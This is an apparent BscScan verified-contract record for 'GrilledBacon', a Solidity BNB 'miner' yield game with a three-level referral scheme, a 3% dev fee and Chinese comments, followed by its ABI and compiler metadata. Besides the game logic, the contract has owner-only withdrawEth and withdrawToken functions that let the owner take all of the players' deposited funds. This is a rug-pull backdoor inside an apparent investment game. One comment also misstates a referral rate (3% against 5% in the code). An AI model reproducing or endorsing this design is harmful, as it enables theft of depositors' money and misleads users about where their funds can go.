{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2022-04-28\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2022-04-15\r\n*/\r\n\r\npragma solidity ^0.4.26; // solhint-disable-line\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract owned {\r\n    address public owner;\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    function transferOwnership(address newOwner) onlyOwner public {\r\n        owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\ncontract GrilledBacon is owned{\r\n    //uint256 EGGS_PER_MINERS_PER_SECOND=1;\r\n    uint256 public EGGS_TO_HATCH_1MINERS=864000;//for final version should be seconds in a day\r\n    uint256 PSN=10000;\r\n    uint256 PSNH=5000;\r\n    bool public initialized=false;\r\n    address public ceoAddress;\r\n    mapping (address => uint256) public hatcheryMiners;//\u70e4\u8089\u6570\u91cf\r\n    mapping (address => uint256) public claimedEggs;//\u5730\u5740\u63a8\u8350\u6536\u76ca\r\n    mapping (address => uint256) public lastHatch;//\u6700\u540e\u6295\u5165\u65f6\u95f4\r\n    mapping (address => address) public referrals;//\u63a8\u8350\u5173\u7cfb\r\n    uint256 public marketEggs;\r\n    constructor() public{\r\n        ceoAddress=msg.sender;\r\n    }\r\n    function hatchEggs(address ref) public{\r\n        require(initialized);\r\n        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {\r\n            ref = ceoAddress;\r\n        }\r\n        //\u7ed1\u5b9a\u63a8\u8350\u4eba\r\n        if(referrals[msg.sender] == address(0)){\r\n            referrals[msg.sender] = ref;\r\n        }\r\n        uint256 eggsUsed=getMyEggs();//\u5f53\u524d\u6536\u76ca\r\n        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);//\u6dfb\u52a0\u70e4\u8089\u6570\u91cf \u70e4\u8089\u6570\u91cf/864000\r\n        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);//\u66f4\u65b0\u70e4\u8089\u6570\u91cf\r\n        claimedEggs[msg.sender]=0;//\u6e05\u7406\u6389\u63a8\u8350\u7684\u70e4\u8089\r\n        lastHatch[msg.sender]=now;//\u66f4\u65b0\u6700\u540e\u6295\u5165\u65f6\u95f4\r\n\r\n        address firstAddress = referrals[msg.sender];\r\n        address secondAddress = referrals[firstAddress];\r\n        address thirdAddress = referrals[secondAddress];\r\n\r\n        //\u53d1\u653e\u76f4\u63a8\u70e4\u8089 \u63d0\u4ea4\u5730\u5740\u7684\u70e4\u8089\u768410%\r\n        claimedEggs[firstAddress]=SafeMath.add(claimedEggs[firstAddress],SafeMath.div(SafeMath.mul(eggsUsed,10),100));\r\n        if (secondAddress!=address(0)){\r\n            //\u95f4\u63a5\u63a8\u8350\u70e4\u8089\u6536\u76ca 5%\r\n            claimedEggs[secondAddress]=SafeMath.add(claimedEggs[secondAddress],SafeMath.div(SafeMath.mul(eggsUsed,5),100));\r\n        }\r\n        if (thirdAddress!=address(0)){\r\n            //\u7b2c\u4e09\u4ee3 3%\r\n            claimedEggs[thirdAddress]=SafeMath.add(claimedEggs[thirdAddress],SafeMath.div(SafeMath.mul(eggsUsed,5),100));\r\n        }\r\n\r\n        //boost market to nerf miners hoarding\r\n        //\u63d0\u632f\u5e02\u573a\uff0c\u524a\u5f31\u77ff\u5546\u56e4\u79ef  marketEggs+5% \u70e4\u8089\r\n        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));\r\n    }\r\n    function sellEggs() public{\r\n        require(initialized);\r\n        //\u70e4\u8089\u6570\u91cf\r\n        uint256 hasEggs=getMyEggs();\r\n        //\u83b7\u53d6\u5f53\u524d\u53ef\u9886\u53d6\u5956\u52b1\r\n        uint256 eggValue=calculateEggSell(hasEggs);\r\n        //\u8ba1\u7b97\u624b\u7eed\u8d39\r\n        uint256 fee=devFee(eggValue);\r\n        //\u6e05\u7406\u63a8\u8350\u70e4\u8089\r\n        claimedEggs[msg.sender]=0;\r\n        //\u66f4\u65b0\u6700\u540e\u65f6\u95f4\r\n        lastHatch[msg.sender]=now;\r\n        //\u6dfb\u52a0\u70e4\u8089\u603b\u6570\u91cf\r\n        marketEggs=SafeMath.add(marketEggs,hasEggs);\r\n        //\u7ed9\u624b\u7eed\u8d39\r\n        ceoAddress.transfer(fee);\r\n        //\u63d0\u73b0\r\n        msg.sender.transfer(SafeMath.sub(eggValue,fee));\r\n    }\r\n    function buyEggs(address ref) public payable{\r\n        require(initialized);\r\n        //\u8ba1\u7b97\u70e4\u8089\u6570\u91cf \u8f93\u5165\u91d1\u989d\uff0c\uff08\u5408\u7ea6\u4f59\u989d-\u8f93\u5165\u91d1\u989d\uff09\r\n        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));\r\n        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));\r\n        // uint256 fee=devFee(msg.value);\r\n        // ceoAddress.transfer(fee);\r\n        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);\r\n        hatchEggs(ref);\r\n    }\r\n\r\n    //magic trade balancing algorithm \u9b54\u672f\u8d38\u6613\u5e73\u8861\u7b97\u6cd5 \u8f93\u5165\u91d1\u989d/\u4e2a\u4eba\u70e4\u8089\u6570\u91cf\uff0c\u5408\u7ea6\u4f59\u989d/\u5269\u4f59\u70e4\u8089\u6570\u91cf\uff0c\u70e4\u8089\u6570\u91cf/\u5408\u7ea6\u4f59\u989d \u8ba1\u7b97\u53ef\u83b7\u5f97\u70e4\u8089\u6570\u91cf\u6216\u8005\u4f59\u989d\r\n    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){\r\n\r\n        // uint256 PSN=10000;\r\n        // uint256 PSNH=5000;\r\n        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));\r\n        //\uff0810000 * \u70e4\u8089\u6570\u91cf\uff09/(5000+ (10000*\u5408\u7ea6\u4f59\u989d+5000*\u8f93\u5165\u91d1\u989d)/\u8f93\u5165\u91d1\u989d)  \u4f8b\u5982\r\n        //\uff0810000 * \u5408\u7ea6\u4f59\u989d\uff09/(5000+ (10000*\u5269\u4f59\u70e4\u8089\u6570\u91cf+5000*\u4e2a\u4eba\u70e4\u8089\u6570\u91cf)/\u4e2a\u4eba\u70e4\u8089\u6570\u91cf)\r\n        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));\r\n    }\r\n    function calculateEggSell(uint256 eggs) public view returns(uint256){\r\n        //\u8ba1\u7b97\u70e4\u8089\u6570\u91cf\u5bf9\u5e94\u7684\u4f59\u989d,\u70e4\u8089\u6570\u91cf\uff0c\u5269\u4f59\u70e4\u8089\u6570\u91cf\uff0c\u5408\u7ea6\u4f59\u989d\r\n        return calculateTrade(eggs,marketEggs,address(this).balance);\r\n    }\r\n    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){\r\n        //\u8ba1\u7b97\u8f93\u5165\u6570\u91cf\u5bf9\u5e94\u7684\u70e4\u8089\u6570\u91cf,\u4f59\u989d\uff0c\u5408\u7ea6\u4f59\u989d\uff0c\u5269\u4f59\u70e4\u8089\u6570\u91cf\r\n        return calculateTrade(eth,contractBalance,marketEggs);\r\n    }\r\n    function calculateEggBuySimple(uint256 eth) public view returns(uint256){\r\n        return calculateEggBuy(eth,address(this).balance);\r\n    }\r\n    function devFee(uint256 amount) public pure returns(uint256){\r\n        return SafeMath.div(SafeMath.mul(amount,3),100);\r\n    }\r\n    function seedMarket() public onlyOwner payable{\r\n        require(marketEggs==0);\r\n        initialized=true;\r\n        marketEggs=86400000000;\r\n    }\r\n    function getBalance() public view returns(uint256){\r\n        return address(this).balance;\r\n    }\r\n    function getMyMiners() public view returns(uint256){\r\n        return hatcheryMiners[msg.sender];\r\n    }\r\n    function getMyEggs() public view returns(uint256){\r\n        //\u63a8\u8350\u6536\u76ca+\u70e4\u8089\u6536\u76ca\r\n        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));\r\n    }\r\n    function getEggsSinceLastHatch(address adr) public view returns(uint256){\r\n        //\u6700\u957f10\u5929\uff0c\u6700\u77ed\u5f53\u524d\u65f6\u95f4-\u4e0a\u6b21\u5356\u51fa\u65f6\u95f4\r\n        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));\r\n        //\u70e4\u8089\u6570\u91cfx\u65f6\u95f4=\u6536\u76ca\r\n        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);\r\n    }\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        //a\u5c0f\u8fd4\u56dea \u5426\u5219\u8fd4\u56deb\r\n        return a < b ? a : b;\r\n    }\r\n\r\n    function withdrawEth(address  addr,uint256 amount) onlyOwner public{\r\n        addr.transfer(amount);\r\n    }\r\n\r\n    function withdrawToken(IERC20 token, uint256 amount)onlyOwner public returns (bool){\r\n        token.transfer(msg.sender, amount);\r\n        return true;\r\n    }\r\n\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    /**\r\n    * @dev Multiplies two numbers, throws on overflow.\r\n    */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Integer division of two numbers, truncating the quotient.\r\n    */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n    */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n    * @dev Adds two numbers, throws on overflow.\r\n    */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[],\"name\":\"ceoAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyMiners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"initialized\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawEth\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"rt\",\"type\":\"uint256\"},{\"name\":\"rs\",\"type\":\"uint256\"},{\"name\":\"bs\",\"type\":\"uint256\"}],\"name\":\"calculateTrade\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eth\",\"type\":\"uint256\"},{\"name\":\"contractBalance\",\"type\":\"uint256\"}],\"name\":\"calculateEggBuy\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"marketEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sellEggs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"devFee\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"seedMarket\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"hatchEggs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"lastHatch\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"claimedEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"hatcheryMiners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"EGGS_TO_HATCH_1MINERS\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eth\",\"type\":\"uint256\"}],\"name\":\"calculateEggBuySimple\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eggs\",\"type\":\"uint256\"}],\"name\":\"calculateEggSell\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"referrals\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"token\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawToken\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"getEggsSinceLastHatch\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"buyEggs\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}]", "ContractName": "GrilledBacon", "CompilerVersion": "v0.4.26+commit.4563c3fc", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://ee6888860fe832cc38d393a7c153c5a80a71a838b3d75564366bddbc252fc43a"}